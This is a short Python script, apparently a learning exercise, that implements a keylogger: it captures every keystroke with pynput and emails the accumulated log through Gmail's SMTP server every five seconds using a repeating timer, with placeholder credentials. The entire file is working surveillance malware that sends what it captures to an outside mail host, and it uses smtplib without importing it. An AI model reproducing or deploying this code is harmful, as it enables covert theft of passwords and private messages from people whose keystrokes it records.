#!/usr/bin/python3
'''
Threading - Run in background , every x second , without interrupting main prog

'''

import pynput.keyboard , threading

log = ""

def process_key_press(key):
	global log
	try:
		log += str(key.char)

	except AttributeError:
		if key == key.space:
			log += " "
		else:
			log += " "+str(key)+"  "
	

def send_mail(email ,password, msg):
	server = smtplib.SMTP("smtp.gmail.com",587) #an instace of google smtp server 
	server.starttls()  
	server.login(email, password)
	server.sendmail(email, email , msg)
	server.quit()



	
def report():
	global log
	send_mail("enterYourMail", "EnterYourPassword" , log)
	log = ""
	timer = threading.Timer(5 , report)
	timer.start()


keyboard_listener = pynput.keyboard.Listener(on_press = process_key_press)
with keyboard_listener:
	report()
	keyboard_listener.join()
